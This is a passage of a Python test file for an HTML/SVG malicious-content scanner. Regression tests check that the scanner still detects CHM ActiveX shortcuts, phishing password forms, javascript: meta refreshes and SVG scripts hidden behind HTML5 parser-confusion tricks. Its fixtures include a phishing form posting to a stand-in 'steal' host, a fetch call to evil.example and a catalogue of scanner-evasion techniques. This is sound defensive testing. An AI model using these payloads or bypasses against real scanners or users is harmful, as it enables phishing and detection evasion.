        assert "HTML_CREDENTIAL_FORM" in _rule_ids(
            _scan(tmp_path, f"r8_cred_{idx}.html", b"<!DOCTYPE html><html><body>" + prefix + cred_tail)
        ), f"CRED missed for prefix {idx}"
        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
            _scan(tmp_path, f"r8_meta_{idx}.html", b"<!DOCTYPE html><html><head>" + prefix + meta_tail)
        ), f"META missed for prefix {idx}"


def test_review_r9_regressions_ns_stack_noscript_and_nested_object(
    tmp_path: Path,
) -> None:
    chm = (
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
    )
    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'

    # Blocker 1: nested <svg><foreignObject><svg>..., bare <foreignObject><svg><script/>,
    # nested foreign CDATA, and SVG HTML integration points (<title>/<desc>)
    cases = (
        b"<!DOCTYPE html><svg><foreignObject><svg><title/></svg></foreignObject></svg>" + chm,
        b"<!DOCTYPE html><svg><foreignObject><svg><style/></svg></foreignObject></svg>" + chm,
        b"<!DOCTYPE html><svg><foreignObject><svg><script/></svg></foreignObject></svg>" + chm,
        b"<!DOCTYPE html><foreignObject><svg><script/></svg>" + chm,
        b'<!DOCTYPE html><svg><foreignObject><svg><![CDATA[ ><x a=" ]]></svg></foreignObject></svg>'
        + chm
        + b'<!--"-->',
        b'<!DOCTYPE html><svg><title><textarea/><x a="</textarea>' + chm + b'<!--"--></title></svg>',
        b'<!DOCTYPE html><svg><desc><textarea/><x a="</textarea>' + chm + b'<!--"--></desc></svg>',
    )
    for idx, doc in enumerate(cases):
        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"r9_ns_{idx}.html", doc)), f"case {idx}"

    # Blocker 2: <noscript> RAWTEXT with unclosed quote
    ns_chm = b'<!DOCTYPE html><html><body><noscript><x a="</noscript>' + chm + b'<!--"--></body></html>'
    ns_cred = b'<!DOCTYPE html><html><body><noscript><x a="</noscript>' + cred + b'<!--"--></body></html>'
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r9_noscript_chm.html", ns_chm))
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "r9_noscript_cred.html", ns_cred))

    # Major 3: nested benign <object></object> inside hhctrl <object>
    nested_obj = (
        b'<!DOCTYPE html><html><body>'
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<object></object><param name="Command" value="ShortCut"></object></body></html>'
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r9_nested_obj.html", nested_obj))


def test_review_r10_regressions_foreign_breakout_caps_and_endtag_runtime(
    tmp_path: Path,
) -> None:
    chm = (
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
    )
    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'

    # Blocker 1a: <svg><style><div>... and <svg><script><p>... break out of foreign content in HTML5
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(
        _scan(
            tmp_path,
            "r10_svg_style_div.html",
            b"<!DOCTYPE html><html><body><svg><style><div>" + cred + b"</div></style></svg></body></html>",
        )
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(
        _scan(
            tmp_path,
            "r10_svg_script_p.html",
            b"<!DOCTYPE html><html><body><svg><script><p>" + chm + b"</p></script></svg></body></html>",
        )
    )

    # Blocker 1b: WHATWG breakout tags (<div>, </p>) & MathML integration points (<mtext>, <annotation-xml>)
    for idx, doc in enumerate(
        (
            b"<!DOCTYPE html><html><body><svg><div><![CDATA[>" + cred + b"</body></html>",
            b'<!DOCTYPE html><html><body><svg><div><textarea><x a="</textarea>'
            + chm
            + b'<!--"--></body></html>',
            b'<!DOCTYPE html><html><body><math><mtext><textarea><x a="</textarea>'
            + chm
            + b'<!--"--></mtext></math></body></html>',
            b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html"><div><![CDATA[>'
            + cred
            + b"</annotation-xml></math></body></html>",
            b"<!DOCTYPE html><html><body><svg></p><![CDATA[>" + cred + b"</body></html>",
        )
    ):
        found = _rule_ids(_scan(tmp_path, f"r10_breakout_{idx}.html", doc))
        assert ("HTML_CREDENTIAL_FORM" in found) or ("HTML_CHM_ACTIVEX" in found), f"case {idx}: {found}"

    # Blocker 2: 1024 nested <object> before hhctrl <object> must NOT fail open
    deep_obj = b"<!DOCTYPE html><html><body>" + b"<object>" * 1024 + chm + b"</body></html>"
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r10_deep_obj.html", deep_obj))

    # Major 3: amortized O(1) handle_endtag on <svg>*1024 + </a>*200_000
    adv_end = b"<!DOCTYPE html>" + b"<svg>" * 1024 + b"</a>" * 200_000
    t0 = time.perf_counter()
    _scan(tmp_path, "r10_adv_end.html", adv_end)
    assert time.perf_counter() - t0 < 2.0


def test_review_r11_regressions_ip_cdata_double_escaped_script_and_png_starvation(
    tmp_path: Path,
) -> None:
    chm = (
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
    )
    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'

    # Blocker 1: WHATWG §13.2.5.42 true CDATA directly inside SVG/MathML integration points
    ip_cases = (
        b'<!DOCTYPE html><html><body><svg><foreignObject><![CDATA[ ><x a=" ]]>'
        + chm
        + b'<!--"--></foreignObject></svg></body></html>',
        b'<!DOCTYPE html><html><body><svg><title><![CDATA[ ><x a=" ]]>'
        + cred
        + b'<!--"--></title></svg></body></html>',
        b'<!DOCTYPE html><html><body><svg><desc><![CDATA[ ><x a=" ]]>'
        + chm
        + b'<!--"--></desc></svg></body></html>',
        b'<!DOCTYPE html><html><body><math><mtext><![CDATA[ ><x a=" ]]>'
        + chm
        + b'<!--"--></mtext></math></body></html>',
        b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html">'
        b'<![CDATA[ ><x a=" ]]>'
        + cred
        + b'<!--"--></annotation-xml></math></body></html>',
    )
    for idx, doc in enumerate(ip_cases):
        found = _rule_ids(_scan(tmp_path, f"r11_ip_cdata_{idx}.html", doc))
        assert ("HTML_CHM_ACTIVEX" in found) or ("HTML_CREDENTIAL_FORM" in found), f"ip {idx}: {found}"

    # Blocker 2: HTML5 <script> double-escaped state (<!--<script></script>...--></script>)
    double_esc = (
        b'<!DOCTYPE html><html><body>'
        b'<script><!--<script></script><x a="--></script>'
        + chm
        + b'<!--"--></body></html>'
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r11_double_esc.html", double_esc))

    # Major 3: 550 distinct benign PNG data-URIs before compact data:text/html & data:image/svg+xml
    png_raw = _minimal_png()
    pngs = "".join(
        f"<img src='data:image/png;base64,{base64.b64encode(png_raw + bytes([i % 256, i // 256])).decode()}'>"
        for i in range(550)
    )
    form_b64 = base64.b64encode(cred).decode("ascii")
    assert len(form_b64) < 128
    svg_b64 = base64.b64encode(b"<svg onload='alert(1)'/>").decode("ascii")
    starve_doc = (
        f"<!DOCTYPE html><body>{pngs}"
        f'<iframe src="data:text/html;base64,{form_b64}"></iframe>'
        f'<object data="data:image/svg+xml;base64,{svg_b64}"></object></body></html>'
    ).encode()
    found_s = _rule_ids(_scan(tmp_path, "r11_png550.html", starve_doc))
    assert {"HTML_CREDENTIAL_FORM", "SVG_SCRIPT"} <= found_s


def test_review_r12_regressions_abrupt_script_comments_and_nested_ip_html(
    tmp_path: Path,
) -> None:
    chm = (
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
    )
    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'
    meta = b'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'

    # Blocker 1: <!--> and <!---> inside <script> return to NORMAL state (no double-escaped)
    for idx, abrupt in enumerate((b"<!-->", b"<!--->")):
        sc = b"<script>" + abrupt + b"<script></script>"
        doc_chm = b"<!DOCTYPE html><html><body>" + sc + chm + b"</body></html>"
        doc_cred = b"<!DOCTYPE html><html><body>" + sc + cred + b"</body></html>"
        doc_meta = b"<!DOCTYPE html><html><head>" + sc + meta + b"</head></html>"
        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"r12_sc_chm_{idx}.html", doc_chm))
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"r12_sc_cred_{idx}.html", doc_cred))
        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
            _scan(tmp_path, f"r12_sc_meta_{idx}.html", doc_meta)
        )

    # Blocker 2: nested <div><div></div> inside SVG/MathML integration points keeps HTML namespace
    nested_ip_cases = (
        b"<!DOCTYPE html><html><body><svg><foreignObject><div><div></div><![CDATA[>"
        + chm
        + b"</div></foreignObject></svg></body></html>",
        b"<!DOCTYPE html><html><body><svg><title><div><div></div><![CDATA[>"
        + cred
        + b"</div></title></svg></body></html>",
        b"<!DOCTYPE html><html><body><math><mtext><div><div></div><![CDATA[>"
        + chm
        + b"</div></mtext></math></body></html>",
        b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html">'
        b"<div><div></div><![CDATA[>"
        + cred
        + b"</div></annotation-xml></math></body></html>",
    )
    for idx, doc in enumerate(nested_ip_cases):
        found = _rule_ids(_scan(tmp_path, f"r12_nest_ip_{idx}.html", doc))
        assert ("HTML_CHM_ACTIVEX" in found) or ("HTML_CREDENTIAL_FORM" in found), f"case {idx}: {found}"



def test_html5_prefixed_tags_do_not_enter_rawtext_or_script_or_svg(tmp_path: Path):
    """r13 Blocker 1: HTML5 has no XML namespace prefixes (<x:style>, <x:script>, <x:svg>)."""
    for i, prefix_tag in enumerate(("<x:style>", "<x:script>", "<x:textarea>", "<x:svg><![CDATA[>")):
        html_bytes = (
            "<!DOCTYPE html><html><body>"
            f"{prefix_tag}"
            '<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
            '<param name="Command" value="ShortCut"></object>'
            "</body></html>"
        ).encode()
        ids = _rule_ids(_scan(tmp_path, f"prefixed_{i}.html", html_bytes))
        assert "HTML_CHM_ACTIVEX" in ids, f"Bypassed via {prefix_tag}"


def test_html5_prefixed_endtag_does_not_close_rawtext(tmp_path: Path):
    """r13 Blocker 1b: </x:style> must NOT close HTML5 <style> RAWTEXT."""
    html_bytes = (
        b'<!DOCTYPE html><html><body>'
        b'<style></x:style><x a="</style>'
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
        b'<!--"-->'
        b'</body></html>'
    )
    ids = _rule_ids(_scan(tmp_path, "prefixed_end.html", html_bytes))
    assert "HTML_CHM_ACTIVEX" in ids


def test_outer_html_endtag_closes_foreign_svg_and_respects_foreignobject_scope(tmp_path: Path):
    """r13 Blocker 2: </div> closes <svg>, while <foreignObject> remains an HTML5 scope boundary."""
    bypass_html = (
        b'<!DOCTYPE html><html><body>'
        b'<div><svg></div>'
        b'<![CDATA[>'
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
        b'</body></html>'
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "outer_div_svg.html", bypass_html))

    scope_html = (
        b'<!DOCTYPE html><html><body>'
        b'<div><svg><foreignObject></div>'
        b'<![CDATA[><style>]]>'
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
        b'</foreignObject></svg></div>'
        b'</body></html>'
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "fo_scope.html", scope_html))


def test_long_event_handler_and_smil_values_not_truncated(tmp_path: Path):
    """r13 Major 3: padded >4096-char event handlers & >256 SMIL values parts still detected."""
    pad = " " * 5000
    cred_html = (
        '<!DOCTYPE html><html><body>'
        '<script></script>'
        '<form><input type="password"></form>'
        f'<button onclick="/*{pad}*/ fetch(\'https://evil.example/steal\')">Go</button>'
        '</body></html>'
    ).encode()
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "long_onclick.html", cred_html))

    svg_redir = (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        f'onload="/*{pad}*/ window.location=\'https://evil.example/p\'">'
        '<rect width="10" height="10"/></svg>'
    ).encode()
    svg_ids = _rule_ids(_scan(tmp_path, "long_onload.svg", svg_redir))
    assert "SVG_SCRIPT" in svg_ids and "SVG_EXTERNAL_REDIRECT" in svg_ids

    smil_svg = (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        f'<animate attributeName="href" values="{"a;" * 300}javascript:alert(1)"/>'
        '</svg>'
    ).encode()
    assert "SVG_SCRIPT" in _rule_ids(_scan(tmp_path, "many_smil.svg", smil_svg))


def test_meta_refresh_with_embedded_newline_entity(tmp_path: Path):
    """r13 Nit 4: java&#10;script: inside meta refresh content must be caught."""
    html_bytes = (
        b'<!DOCTYPE html><html><head>'
        b'<meta http-equiv="refresh" content="0;url=java&#10;script:alert(1)">'
        b'</head><body></body></html>'
    )
    assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(_scan(tmp_path, "meta_nl.html", html_bytes))
